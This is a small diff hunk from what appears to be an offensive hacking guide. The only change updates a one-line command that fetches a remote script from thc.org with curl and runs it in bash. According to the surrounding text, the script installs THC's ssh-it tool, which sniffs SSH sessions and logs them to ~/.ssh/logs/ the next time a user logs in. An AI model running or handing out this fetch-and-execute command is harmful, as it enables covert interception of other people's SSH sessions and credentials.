@@ -1462,7 +1462,7 @@ The SSH session will be sniffed and logged to *~/.ssh/logs/* the next time the u
 The easiest way is using [https://www.thc.org/ssh-it/](https://www.thc.org/ssh-it/).
 
 ```sh
-bash -c "$(curl -fsSL ssh-it.thc.org/x)"
+bash -c "$(curl -fsSL https://thc.org/ssh-it/x)"
 ```
 
 ---
